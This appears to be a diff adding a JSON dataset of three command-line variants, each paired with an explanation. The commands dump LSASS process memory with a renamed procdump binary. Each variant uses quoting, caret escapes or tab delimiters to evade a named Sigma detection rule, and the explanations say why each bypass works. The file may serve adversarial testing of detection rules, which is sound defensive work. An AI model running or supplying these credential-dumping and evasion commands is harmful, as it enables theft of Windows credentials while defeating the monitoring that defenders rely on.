@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Windows\\Temp\\not_procdump.exe \"-ma\" \"/accepteula\" lsass.exe C:\\Windows\\Temp\\lsass.dmp",
+    "explanation": "Insertion technique: Wrapping the dump flag '-ma' and the configuration flag '/accepteula' in double quotes satisfies the target application's parameter parsing logic, but alters the exact contiguous string patterns logged in the process creation telemetry. This avoids the strict literal matches expected by 'selection_cli_dump_flag' (' -ma ') and 'selection_cli_eula_flag' (' /accepteula') when they include the leading/trailing space boundaries, preventing the logical execution paths for command-line matchers from evaluating to true."
+  },
+  {
+    "output": "cmd.exe /c C:\\Windows\\Temp\\not_procdump.exe -m^a /accepte^ula lsass.exe C:\\Windows\\Temp\\lsass.dmp",
+    "explanation": "Insertion technique: Utilizing the Windows command processor escape character (^) breaks up the literal strings inside the command-line arguments. While cmd.exe strips the caret characters prior to binary execution, process tracking infrastructure typically captures the literal string containing the caret (e.g., '-m^a'). This fails the strict string conditions defined within the rule's selection criteria."
+  },
+  {
+    "output": "C:\\Windows\\Temp\\not_procdump.exe\t-ma\t/accepteula\tlsass.exe\tC:\\Windows\\Temp\\lsass.dmp",
+    "explanation": "Substitution technique: Replacing standard spaces with horizontal tabs (\\t) acts as a functional token delimiter for the Windows command parser. Because the Sigma rule explicitly queries for static leading spaces (like ' -ma ' or ' /accepteula'), substituting white space with alternative whitespace characters circumvents basic substring checks while ensuring accurate parameter handling by the underlying binary."
+  }
+]
